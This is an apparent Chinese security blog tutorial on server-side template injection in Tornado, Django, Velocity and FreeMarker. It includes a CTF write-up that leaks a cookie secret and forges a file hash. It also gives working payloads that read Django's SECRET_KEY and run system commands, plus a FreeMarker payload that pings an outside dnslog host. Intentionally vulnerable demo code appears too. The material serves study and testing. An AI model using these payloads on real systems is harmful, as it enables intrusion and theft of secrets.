import tornado.template
import tornado.ioloop
import tornado.web
TEMPLATE = '''
<html>
 <head><title> Hello {{ name }} </title></head> <body> Hello max </body>
</html>
'''
class MainHandler(tornado.web.RequestHandler):

    def get(self):
        name = self.get_argument('name', '')
        template_data = TEMPLATE.replace("FOO",name)
        t = tornado.template.Template(template_data)
        self.write(t.generate(name=name))

application = tornado.web.Application([(r"/", MainHandler),], debug=True, static_path=None, template_path=None)

if __name__ == '__main__':
    application.listen(8000)
    tornado.ioloop.IOLoop.instance().start()

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911185502398-402029706.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911185502398-402029706.png)

这里拿一道BUUCTF的题来演示一下tornado render模板注入：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230948354-1221642454.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230948354-1221642454.png)

flag.txt：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903231123661-1731456025.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903231123661-1731456025.png)

welcome.txt

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903231255390-418247473.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903231255390-418247473.png)

hints.txt

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903231526172-982886875.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903231526172-982886875.png)

根据上面的信息，我们知道flag在/fllllllllllllag文件中

render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用

最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：

http://4dd65e36-edbf-4402-b6a3-75993b8c618d.node3.buuoj.cn/file?filename=/flag.txt&filehash=284090432706edeffa4679e60f0fff03

推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret

在tornado模板中，存在一些可以访问的快速对象，比如 {{escape(handler.settings["cookie"])}}，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《[python SSTI tornado render模板注入](https://www.cnblogs.com/cimuhuashuimu/p/11544455.html)》。

观察错误页面，发现页面返回的由msg的值决定

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903233530649-1247101816.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903233530649-1247101816.png)

修改msg的值注入{{handler.settings}}，获得环境变量

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903233721068-1721567768.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903233721068-1721567768.png)

得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本

import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret="ad53693f-47f6-4c89-b072-0673e0fbbc17"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())

得到filehash=ceba5d7a8acd8c4fb77cfb58c9534971，获取flag

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903234158628-1148950140.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903234158628-1148950140.png)

先看存在漏洞的代码：

def view(request, *args, **kwargs):
    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user))

很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。

后来发现Django自带的应用 "admin"（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911002243408-1781833415.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911002243408-1781833415.png)

所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。

payload如下：

http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}

http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}

java常见的引擎：FreeMarker， velocity

（以下板块参照自《[CVE-2019-3396 Confluence Velocity SSTI漏洞浅析](https://xz.aliyun.com/t/8135#toc-2)》）

Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。

**语句标识符**

#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。

**变量**

$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a

**声明**

set用于声明Velocity脚本变量，变量可以在脚本中声明

#set($a ="velocity")
#set($b=1)
#set($arrayName=["1","2"])

**注释**

单行注释为##，多行注释为成对出现的#* ............. *#

**条件语句**

以if/else为例：

#if($foo<10)
    <strong>1</strong>
#elseif($foo==10)
    <strong>2</strong>
#elseif($bar==6)
    <strong>3</strong>
#else
    <strong>4</strong>
#end

**转义字符**

如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$

使用Velocity主要流程为：

- 初始化Velocity模板引擎，包括模板路径、加载类型等
- 创建用于存储预传递到模板文件的数据的上下文
- 选择具体的模板文件，传递数据完成渲染

VelocityTest.java

package Velocity;

import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;

import java.io.StringWriter;

public class VelocityTest {
    public static void main(String[] args) {

        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, "file");
        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, "src/main/resources");
        velocityEngine.init();


        VelocityContext context = new VelocityContext();
        context.put("name", "Rai4over");
        context.put("project", "Velocity");


        Template template = velocityEngine.getTemplate("test.vm");
        StringWriter sw = new StringWriter();
        template.merge(context, sw);
        System.out.println("final output:" + sw);
    }
}

模板文件：src/main/resources/test.vm

Hello World! The first velocity demo.
Name is $name.
Project is $project

输出结果：

final output:
Hello World! The first velocity demo.
Name is Victor Zhang.
Project is Velocity
java.lang.UNIXProcess@12f40c25

通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。

通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。

通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png)

这里使用java-sec-code里面的SSTI代码：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png)

poc：

http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png)

参照《[白头搔更短，SSTI惹人心！](https://xz.aliyun.com/t/7466)》简单进行调试

在最初的Controller层下断点，来追踪poc的解析过程：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png)

（template -> instring）进入 Velocity.evaluate 方法：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png)

（instring -> reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png)

跟进 StringReader 方法查看详情：  
[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png)

（reader -> nodeTree）继续跟进 this.evaluate() 方法

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png)

（nodeTree -> writer）继续跟进render方法

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png)

emmm...继续跟进render

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png)

继续看render方法

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png)

跟进execute方法

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png)

可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE

根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段

具体漏洞代码调试可以参考：《[Confluence未授权模板注入/代码执行(CVE-2019-3396)](https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/)》

　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](https://lucifaer.com/2019/04/16/Confluence%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-3396%EF%BC%89/#0x01-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0)》

FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png)

**FreeMarker模板代码**：

<html>
<head>
  <title>Welcome!</title>
</head>
<body>　<#–这是注释–>
  <h1>Welcome ${user}!</h1>
  <p>Our latest product:
  <a href="${latestProduct.url}">${latestProduct.name}</a>!
</body>
</html>

模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${...} 的部分， 之后将结果发送到访问者的Web浏览器中。

这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象

具体的高级内置函数定义参考《[Seldom used and expert built-ins](https://freemarker.apache.org/docs/ref_builtins_expert.html)》

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png)

主要的用法如下：

<＃ - 创建一个用户定义的指令，调用类的参数构造函数 - >
<#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）>
<＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - >
<#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）>

调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute

freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：

<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()

freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。

<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>

这里使用测试代码来大概演示一下：[https://github.com/hellokoding/springboot-freemarker](https://github.com/hellokoding/springboot-freemarker)

代码演示说明：[https://hellokoding.com/spring-boot/freemarker/](https://hellokoding.com/spring-boot/freemarker/)

前端代码　　——>　　hello.ftl

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello ${name}!</title>
    <link href="/css/main.css" rel="stylesheet">
</head>
<body>
    <h2 class="hello-title">Hello ${name}!</h2>
    <script src="/js/main.js"></script>
</body>
</html>

后端代码　　——>　　HelloController.java：

package com.backendvulnerabilities.ssti;

import freemarker.cache.MultiTemplateLoader;
import freemarker.cache.StringTemplateLoader;
import freemarker.cache.TemplateLoader;
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;
import freemarker.template.utility.DateUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

@Controller
public class HelloController {

    @Autowired
    private  Configuration con;

    @GetMapping("/")
    public String index() {
        return "index";
    }

    @RequestMapping(value = "/hello")
    public String hello(@RequestBody Map<String,Object> body, Model model) {
        model.addAttribute("name", body.get("name"));
        return "hello";
    }

    @RequestMapping(value = "/freemarker")
    public void freemarker(@RequestParam("username") String username, HttpServletRequest httpserver,HttpServletResponse response) {
        try{
            String data = "1ooooooooooooooooooo~";
            String templateContent = "<html><body>Hello " + username + " ${data}</body></html>";
            String html = createHtmlFromString(templateContent,data);
            response.getWriter().println(html);

            }catch (Exception e){
                e.printStackTrace();
            }
    }

    private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException {
        Configuration cfg = new Configuration();
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        stringLoader.putTemplate("myTemplate",templateContent);
        cfg.setTemplateLoader(stringLoader);
        Template template = cfg.getTemplate("myTemplate","utf-8");
        Map root = new HashMap();
        root.put("data",data);

        StringWriter writer = new StringWriter();
        template.process(root,writer);
        return writer.toString();
    }

    @RequestMapping(value = "/template", method =  RequestMethod.POST)
    public String template(@RequestBody Map<String,String> templates) throws IOException {
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        for(String templateKey : templates.keySet()){
            stringLoader.putTemplate(templateKey, templates.get(templateKey));
        }
        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]{stringLoader,
            con.getTemplateLoader()}));
        return "index";
    }
}

上述代码主要编译给定的模板字符串和数据，生成HTML进行输出

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png)

模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。

首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload

{"hello.ftl": "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"ping ilxwh0.dnslog.cn\") }<title>Hello!</title><link href=\"/css/main.css\" rel=\"stylesheet\"></head><body><h2 class=\"hello-title\">Hello!</h2><script src=\"/js/main.js\"></script></body></html>"}

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png)

关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png)

重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png)

dnslog平台也受到了请求

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png)